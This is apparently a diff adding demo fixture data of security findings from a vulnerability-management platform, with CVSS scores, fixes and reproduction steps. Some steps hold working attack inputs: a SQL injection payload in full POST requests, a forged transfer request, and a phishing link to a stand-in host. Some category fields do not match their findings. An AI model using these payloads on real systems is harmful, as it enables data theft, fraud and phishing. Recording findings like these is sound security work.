+        "detail": "Go to the login page and create an account. It will need a real email for verification. For simplicity of reproducing the vulnerability the credentials I used are:\n\nSYNACKTesting:Pa$$word1",
+        "url": "http://Scrubbed",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118842,
+        "number": 2,
+        "detail": "You will be taken to the main plan shopping page and select \"Shop for plans\". Note that at the time of testing some calls took up to 5 minutes to respond with loading the next page.",
+        "url": "http://scrubbed.aspx#media",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118843,
+        "number": 3,
+        "detail": "At this point, ensure that all calls to the JSON database are changed from the current effective date (at my testing 2021-02-07) to the date of your choice. I backdated it one month to 2021-01-01. The most effective way to ensure this is to use Burp Proxy's match and replace rule to ensure that none are missed either in the put or post requests. Additionally, the Deliorian Time Machine date needs to be changed too.\n\nThen simple way to do this is to use the match and replace with the two following commands:\n\nRequest Body: (this is the write to the JSON Database)\nMatch: 2021-02-01\nReplace: 2021-02-01\n\nRequest Header: (this is the write over the Delorian Time Machine Date)\nMatch: 2021-02-07 (please use current date in YYYY-MM-DD format)\nReplace: 2021-01-07",
+        "url": "http://Scrubbed/editMedia.aspx",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118844,
+        "number": 4,
+        "detail": "The next pages will ask for more information and most of the fields can actually be edited later, but as they are input by the attacker for the most part, they do not have a serious impact on the security of the site. I chose the first option and the date you have for the Delorian Time Machine replace date as the date of the event.",
+        "url": "http://Scrubbed/editMedia.aspx",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118845,
+        "number": 5,
+        "detail": "The next page is Shop for Individual and Family Plans. Put in any information you like. Please note that the zip code put in here will need a real address later.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118846,
+        "number": 6,
+        "detail": "I chose the first plan on the list and clicked Select.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118847,
+        "number": 7,
+        "detail": "The following page is an agreement to the terms. Check all three boxes and next.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118848,
+        "number": 8,
+        "detail": "Fill in the information in the Primary policy holder information. Note that here the address I used must match the ZIP provided and used earlier or you will get an error. Continue to the next page when finished.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118849,
+        "number": 9,
+        "detail": "Leave the next page defaults.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118850,
+        "number": 10,
+        "detail": "After agreeing to the warning, turn off the replace rule in Brup. First, it will not be needed from here. Secondly, this will help eliminate the possibility of a false positive client side reflection of that data and show that it is from the database itself.\n\nYou will see a documentation section, which is due to the plan type and selections we made in the beginning as to why we don't have insurance and the date (I selected that we had lost it, so this is referencing that). We will have another warning for not inputting the data here.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118851,
+        "number": 11,
+        "detail": "We will finally get to the policy review here. As per scope this is the farthest we are allowed to go as the data from here goes to a third party. We can note that the effective date is now in the past on the plan notes and all other data is correct that we have not changed. You can also note that for a bit we have not seen the PUT request and modified data, so that shows that this is coming from the JSON data.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118852,
+        "number": 12,
+        "detail": "Video is attached to help reproduce.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-h001-4"
+  },
+  {
+    "id": "synack-demo-w003-2",
+    "title": "SQL Injection in price-order API",
+    "tag_list": [
+
+    ],
+    "description": "When an order is placed using the scrubbed.com website, the \"scrubbed\" API is called to look up the price prior to the order being finalized.  Testing demonstrated that the /order/price API is vulnerable to an error-based SQL injection attack via the \"idx\" parameter.",
+    "impact": "A SQL injection attack typically allows an attacker to access, update, delete or create data in the relational database that stores application data. The API in question appears to limit the length of the input passed to the database, which made executing the database queries and proof-of-concept exploits more difficult.\n\nIn an effort not to impact the systems under test, only the database configuration details were retrieved.  This included retrieving the following information from the underlying server:\n\nDatabase Banner (@@version):\n\nMicrosoft SQL Server 2008 R2 (SP2) - xx.xx.xxxx.0 (X64) \nFeb  7 2014 17:23:24 \nCopyright (c) Microsoft Corporation\nExpress Edition with Advanced Services (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)\n\nuser_name()\ndbo\nguest\nsys\nPOS\n\nhost_name():\nSCRUBPOS522\n\nDB_NAME():\nmaster\nmodel\ntempdb\npos\ncontrols\nextracts\nhistory\nstore\n\n\nFile_name():\nPOS_Data\nPOS_Log\nValidation Steps",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Filter/Signature Evasion",
+      "parent": "SQL Injection"
+    },
+    "cvss_final": 9.3,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Physical (P)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:P/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
+    "recommended_fix": "All input should be sanitized prior to passing it to a database query.  Additionally SQL queries should be performed using parameterized statements.  This will ensure that the database driver can properly escape input data and limit the chance of a SQL injection vulnerability.",
+    "exploitable_locations": [
+
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-24T12:26:09+00:00",
+    "resolved_at": "2023-10-05T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185995,
+      "text": "In Review",
+      "created_at": "2023-10-02T16:18:51.776Z",
+      "flow_position": 1,
+      "flow_type": 1
+    },
+    "listing": {
+      "id": 105854,
+      "codename": "SYNACK-DEMO-W003",
+      "slug": "demoweb003",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb003"
+    },
+    "validation_steps": [
+      {
+        "id": 118834,
+        "number": 1,
+        "detail": "The following POST request can be sent to the server.  Note that a SQL query has been appended to the \"idx\" parameter.\n\n-----\n\nPOST /order/price HTTP/1.1\nHost: scrubbed.com\nConnection: keep-alive\nContent-Length: 967\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\nContent-Type: application/json; charset=UTF-8\n\n{\"Scrubbed\":{\"Address\":{\"Street\":\"123 MAIN ST\",\"City\":\"LittleTown\",\"idx\":\"'+convert (int,(@@version))+'\",\"PostalCode\":\"00000-1234\",\"Scrubbed\":\"test\",\"Type\":\"Business\",\"Name\":\"test\",\"StreetName\":\"LAKE DR\"},\"Coupons\":[],\"CustomerID\":\"0123498765--9AEF01234\",\"Email\":\"a_test_account@yahoo.com\",\"Extension\":\"123\",\"FirstName\":\"test<b>d\",\"LastName\":\"test<b>l\",\"LanguageCode\":\"en\",\"order:\"123456\",\"lead\":\"online\",\"type\":\"webapi\",\"Payments\":[],\"Phone\":\"6505551212\",\"PhonePrefix\":\"\",\"Products\":[{\"Code\":\"Scrubbed\",\"Scrubbed{\"1/1\":\"1\"}}}],\"ServiceMethod\":\"Delivery\",\"SourceOrganizationURI\":\"Scrubbed.com\",\"LocID\":\"1536\",\"Tags\":{},\"Version\":\"1.0\",\"NoCombine\":true,\"Partners\":{\"Scrubbed\":{\"Tags\":{}}},\"Scrubbed\":[],\"Scrubbed\":{\"Scrubbed\":true,\"Scrubbed\":false}}}",
+        "url": "https://scrubbed.com/order/price",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118835,
+        "number": 2,
+        "detail": "As noted in the impact steps, it is possible to query for many different values, or just attempt a full database query.  For example, the same request is modified below to return the system hostname instead:\n\n-----\n\nPOST /order/price HTTP/1.1\nHost: scrubbed.com\nConnection: keep-alive\nContent-Length: 967\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\nContent-Type: application/json; charset=UTF-8\n\n{\"Scrubbed:{\"Address\":{\"Street\":\"123 MAIN ST\",\"City\":\"LittleTown\",\"idx\":\"'+convert (int,host_name())+'\",\"PostalCode\":\"00000-1234\",\"Scrubbed\":\"test\",\"Type\":\"Business\",\"Name\":\"test\",\"StreetName\":\"Scrubbed\"},\"Scrubbed\":[],\"CustomerID\":\"0123498765--9AEF01234\",\"Email\":\"a_test_account@yahoo.com\",\"Extension\":\"123\",\"FirstName\":\"test<b>d\",\"LastName\":\"test<b>l\",\"LanguageCode\":\"en\",\"order:\"123456\",\"lead\":\"online\",\"type\":\"webapi\",\"Payments\":[],\"Phone\":\"6505551212\",\"PScrubbed\":\"\",\"Products\":[{\"Code\":\"Scrubbed\"ServiceMethod\":\"Scrubbed\",\"SourceOrganizationURI\":\"Scrubbed.com\",\"LocID\":\"1536\",\"Tags\":{},\"Version\":\"1.0\",\"NoCombine\":true,\"Scrubbed\":{\"Scrubbed\":{\"Tags\":{}}},\"Scrubbed\":[],\"Scrubbed\":{\"Scrubbed\":true,\"CalculatePotentialPoints\":false}}}",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-w003-2"
+  },
+  {
+    "id": "dataseedingtestorg-w90028969-1",
+    "title": "Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Persistent XSS",
+      "parent": "Cross-Site Scripting (XSS)"
+    },
+    "cvss_final": 6.8,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "High (H)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "High (H)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:H",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-24T12:26:08+00:00",
+    "resolved_at": "2023-10-10T12:28:01+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185995,
+      "text": "In Review",
+      "created_at": "2023-10-02T16:18:51.776Z",
+      "flow_position": 1,
+      "flow_type": 1
+    },
+    "listing": {
+      "id": 105857,
+      "codename": "DataSeedingTestOrg-W90028969",
+      "slug": "demoweb90028969",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb90028969"
+    },
+    "validation_steps": [
+      {
+        "id": 118827,
+        "number": 1,
+        "detail": "Login and browse to URL.",
+        "url": "https://qa.scrubbed.com/site/app.php",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118828,
+        "number": 2,
+        "detail": "Click on Permissions section placed at just right corner as shown as in image.",
+        "url": "https://qa.scrubbed.com/site/app.php",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118829,
+        "number": 3,
+        "detail": "Click on new permission.",
+        "url": "https://qa.scrubbed.com/site/app.php",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118830,
+        "number": 4,
+        "detail": "Enter the xss payload inside name field and enter any user's email inside email field. Click on preview email.",
+        "url": "https://qa.scrubbed.com/site/app.php",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118831,
+        "number": 5,
+        "detail": "Now copy the link which has generated after clicking on preview email button.",
+        "url": "https://qa.scrubbed.com/site/app.php",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118832,
+        "number": 6,
+        "detail": "Logout from current user and load the link copied in step 5. please notice that xss will occur. It will affect other users as well, an attacker just need to send this link to others or send the link using trusted email address. Additionally, If you notice the Link, it contains an accessid token. As soon as the user clicks on the link and join the cap table. The accessid will expire.",
+        "url": "https://qa.scrubbed.com/site/access.php?accessid=acc4f7b3542d8&code=556f47b35437d&from=a%252520a",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118833,
+        "number": 7,
+        "detail": "Please find the attached video POC. The vulnerability is reproducible across all standard browsers latest version.",
+        "url": "https://qa.scrubbed.com/site/access.php?accessid=acc4f7b3542d8&code=556f47b35437d&from=a%252520a",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/dataseedingtestorg-w90028969-1"
+  },
+  {
+    "id": "synack-demo-w003-1",
+    "title": "Remote Access to Managed Devices in Client Customer Networks Possible",
+    "tag_list": [
+
+    ],
+    "description": "The system at 192.168.1.1 is running an instance of Manager.  This instance is configured to be part of a cluster, but the other cluster hosts do not have external IP addresses assigned.  The Administrator password for this device is weak and easily guessed which then allows for complete access to the device.\r\n\r\nOnce access was gained to this device, a valid domain account for the Client network was discovered.  This domain account provides full access into the user’s webmail, Client’s internal networks, and their global remote customer management systems.\r\n\r\nWith permission, I would like authorization to make configuration changes to this device that a allow APT-like persistence and a reverse shell on the device to continue analysis if this is valuable to the Client’s mitigation effort.",
+    "impact": "The administrative account allows full control of this device to be obtained.  In addition to gaining full control of the device, the  device configuration was examined to determine if any additional sensitive data could be obtained. The attached file \"user-creds.png\" was discovered and contains many of the same credentials that were obtained from this device's configuration.\r\n\r\nThis device appears to be used by Sales Engineers to remotely access and configure customer networks. The credentials attached contain credentials to the client/vendor’s devices installed at several notable global companies including Customer1, Customer2, and Customer 3. In addition to credentials, the file includes names, email addresses of internal and external users, and names of internal customer hosts.  The most significant of these however was the \"clientuser\" account.\r\n\r\nThe clientuser was verified to be a Client domain user, with full permission to authenticate as an employee to internal Client systems.  A screenshot showing this user's webmail and communications with on boarding customers, as well as a screenshot showing access to their internal confidential wiki are attached.\r\n\r\nAdditional testing of internal systems is Out of Scope so no further access tests were made, however it does appear that this account could easily be used to VPN and gain access to many Client customer networks in a addition to their own.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Persistent XSS",
+      "parent": "Cross-Site Scripting (XSS)"
+    },
+    "cvss_final": 7.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Adjacent (A)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "High (H)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:L/UI:R/S:U/C:L/I:H/A:H",
+    "recommended_fix": "The use of common or weak credentials greatly increases the risk of host compromise.  Even untargeted attacks are likely to use scripts that will guess common passwords, such as ones including the company name.  This makes it very important to use strong passwords on all devices and systems which are externally accessible.\r\n\r\nThis particular device appears to only have the single account defined, and it does not make use of any central authentication (eg: Active Directory).  The password for the admin account should be changed to a strong password and changed regularly.  Since this is a device password, and not a user password which needs to be memorized, it should be set to  something as strong as possible.  This password should contain letters, numbers, and symbols, and be at least 15 characters  long.  Passwords should not include names or dictionary words.  \r\n\r\nDomain user credentials should never be exposed on shared devices.  The password for the clientuser account is something that could be easily cracked if a hash of the password was ever obtained.  Since this account appears to be a shared service account, it should have a strong password, and the use of the account should be both restricted and audited.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "http://example.org/trula"
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-24T12:26:05+00:00",
+    "resolved_at": "2022-11-03T12:30:35+00:00",
+    "closed_at": "2022-12-13T12:30:35+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105854,
+      "codename": "SYNACK-DEMO-W003",
+      "slug": "demoweb003",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb003"
+    },
+    "validation_steps": [
+      {
+        "id": 118807,
+        "number": 1,
+        "detail": "Log in to the device at https://192.168.1.1/page or https://192.168.1.1/otherpage",
+        "url": null,
+        "ip_address": "192.168.1.1",
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118808,
+        "number": 2,
+        "detail": "The following credentials can be used to log in:\r\n\r\nUsername: Username123\r\nPassword: Password123\r\n\r\nA screenshot of this interface is shown in the attached screenshot \"webinterface.png\".",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118809,
+        "number": 3,
+        "detail": "This device does not appear to have the SSH port accessible.  Reconfiguration of device settings could allow for an outgoing shell connection, however this device was set to be a slave in the cluster.  In an effort to not break device configurations this reconfiguration for APT-like persistence was not performed.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-w003-1"
+  },
+  {
+    "id": "synack-demo-h001-3",
+    "title": "Lack of CSRF Enables Money Transfer Between Accounts",
+    "tag_list": [
+
+    ],
+    "description": "It is possible to transfer money between any two separate accounts using the authenticated session of a completely different third account. This is enabled by four different issues:\r\n\r\n1. No CSRF protection\r\n2. Logic Flaws Allow Unauthorized Operations\r\n3. Easily Guessed UserIDs\r\n4. Information Disclosure of Account Balance\r\n\r\n1. An attacker can potentially launch a mass CSRF attack tricking victim users to deposit all money from their account to the attacker's account. Please note that this would only be possible via CSRF because in the flow described above.",
+    "impact": "If an attacker tries to enter their own User_id and a random Account_id, it will not work. There appears to be a check to ensure that an attacker is not able to use their own session to transfer money from somebody else to to their own account in the same session.\r\n\r\n2. An attacker can potentially use his own account to transfer money from random accounts to other random accounts without the account owner's consent/knowledge.\r\n\r\n3. An attacker is able to see the balance of random users.\r\n\r\nSee the two attached screenshots showing different transaction IDs and the balance decreasing from 22750 to 22749 of Account_ID 1",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Persistent XSS",
+      "parent": "Cross-Site Scripting (XSS)"
+    },
+    "cvss_final": 8.3,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Adjacent (A)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "High (H)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:L/UI:R/S:C/C:L/I:H/A:H",
+    "recommended_fix": "1. Make User IDs non-guessable\r\n2. Implement CSRF protection\r\n3. Implement authorization checks to ensure unauthorized users are not allowed to perform operations that they are not supposed to.",
+    "exploitable_locations": [
+      {
+        "type": "other",
+        "value": "Tolos"
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-24T12:26:05+00:00",
+    "resolved_at": "2022-10-09T12:30:35+00:00",
+    "closed_at": "2022-11-22T12:30:35+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105851,
+      "codename": "SYNACK-DEMO-H001",
+      "slug": "demohost01",
+      "category": "Host",
+      "link": "https://client.synack.com/assessments/demohost01"
+    },
+    "validation_steps": [
+      {
+        "id": 118802,
+        "number": 1,
+        "detail": "Setup an environment where requests originating from the CLIENT mobile application can be proxyed through Burp Suite.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118803,
+        "number": 2,
+        "detail": "Open the mobile app, enter the PIN, and access the application.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118804,
+        "number": 3,
+        "detail": "Navigate to the Pay feature, search for the test user, enter the dollar amount ($1), enter a note, and Send.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118805,
+        "number": 4,
+        "detail": "Intercept the request in Burp, change the \"account_id\" value from the attacker’s account_id to 1 and forward the request. The request should look like below:\r\n\r\nPOST /member HTTP/1.1\r\nHost: api.client.com\r\nAuthorization: Basic My42LjM6am9vdml1dmVlc29oeWFodGhlZXJvYXhlZXF1ZXVxdWk=\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en;q=1, fr;q=0.9, de;q=0.8, zh-Hans;q=0.7, zh-Hant;q=0.6, ja;q=0.5\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nCookie: csess=<redacted>\r\nContent-Length: 127\r\nConnection: keep-alive\r\nProxy-Connection: keep-alive\r\nUser-Agent: Client/3.6.5\r\n\r\naction=transfer&request=%7B%22message%22%3A%22Test%22%2C%22user_id%22%3A12%2C%22account_id%22%3%22amount%22%%7D\r\n\r\nThis will send $1 from Account_id 1 to User_id 12 with the note \"Test\".",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118806,
+        "number": 5,
+        "detail": "Note that the server responds back with a successful response, transaction ID. In addition, the balance of the third party account - Account_id 1 - is also returned to the attacker user.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-h001-3"
+  },
+  {
+    "id": "synack-demo-w004-1",
+    "title": "Token Auth Email Spoofing",
+    "tag_list": [
+
+    ],
+    "description": "The API allows for a call which generates an email to a specified address. I'm not too sure the exact purpose of the email, however the name parameter has no restrictions on it, allowing an attacker to inject arbitrary HTML into the email. This can then be used to perform any number of very effective phishing style attacks, as the email does indeed come from the client's email system.  This issue allows an attacker to carry out very effective phishing attacks against users. No spam or email protection system is likely to block the emails as they come from the trusted client email server directly.",
+    "impact": "No authentication of any sort is needed for this API call, leaving it open for even just regular spammers to abuse as well! Best of all, it is all done with a GET request, allowing an attacker to embed the query in image links, and have arbitrary users issue the request, preventing any sort of rate limiting or IP filtering.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Spoof HTML Content",
+      "parent": "Content Injection"
+    },
+    "cvss_final": 6.9,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:L",
+    "recommended_fix": "Switch this to a POST request, and filter what is allowed to be entered into the name field. \r\n\r\nSince I am unsure of the exact purpose of this API call, there may be additional ways to limit access to it which would be effective.",
+    "exploitable_locations": [
+      {
+        "type": "ip",
+        "address": "2.42.22.179",
+        "port": 64463,
+        "protocol": "tcp"
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-24T12:26:04+00:00",
+    "resolved_at": "2023-10-17T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185994,
+      "text": "Pending Review",
+      "created_at": "2023-10-02T16:18:51.772Z",
+      "flow_position": 0,
+      "flow_type": 0
+    },
+    "listing": {
+      "id": 105855,
+      "codename": "SYNACK-DEMO-W004",
+      "slug": "demoweb004",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb004"
+    },
+    "validation_steps": [
+      {
+        "id": 118789,
+        "number": 1,
+        "detail": "The following URL shows an example of this issue. Of note is the \"name_full\" parameter which can include arbitrary HTML content. The example, while not in any way well formed shows that you can send a fake password reset link to another domain, and have the email come through with that link. The \"email\" parameter can be used to specify any email address to target.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118790,
+        "number": 2,
+        "detail": "Vist this URL",
+        "url": "https://api.scrubbed.com/1.0/ogdem/user/token_auth?oid=scrubbed&device_id=3&name_full=%3Ch1%3ENew%20email%20here%3C/h1%3E%3Cbr%3EPlease%20go%20to%20%3Ca%20href=http://exfiltrated.com/%3Ewww.scrubbed.com/accounts%3C/a%3E%20and%20update%20your%20password!%3Cbr%3E&email=test2014@mailinator.com (http://api.scrubbed.com/1.0/ogdem/user/token_auth?oid=scrubbed&device_id=3&name_full=%3Ch1%3ENew%20email%20here%3C/h1%3E%3Cbr%3EPlease%20go%20to%20%3Ca%20href=http://exfiltrated.com/%3Ewww.scrubbed.com/accounts%3C/a%3E%20and%20update%20your%20password!%3Cbr%3E&email=test2014@mailinator.com)",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-w004-1"
+  },
+  {
+    "id": "synack-demo-h001-2",
+    "title": "DoS vulnerability in upload function",
+    "tag_list": [
+
+    ],
+    "description": "Malicious image uploads can result in a DoS.",
+    "impact": "This could lead to a denial of service",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "DoS against a specific server service",
+      "parent": "Denial-of-service (DoS)"
+    },
+    "cvss_final": 2.5,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Local (L)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N",
+    "recommended_fix": "Ensure a threshold is set for the maximum amount of pixels an uploaded image can have.",
+    "exploitable_locations": [
+      {
+        "type": "app-location",
+        "value": "Prodder"
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-24T12:26:03+00:00",
+    "resolved_at": "2023-10-08T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185994,
+      "text": "Pending Review",
+      "created_at": "2023-10-02T16:18:51.772Z",
+      "flow_position": 0,
+      "flow_type": 0
+    },
+    "listing": {
+      "id": 105851,
+      "codename": "SYNACK-DEMO-H001",
+      "slug": "demohost01",
+      "category": "Host",
+      "link": "https://client.synack.com/assessments/demohost01"
+    },
+    "validation_steps": [
+      {
+        "id": 118785,
+        "number": 1,
+        "detail": "Go to https://scrubbed.com/account/profile",
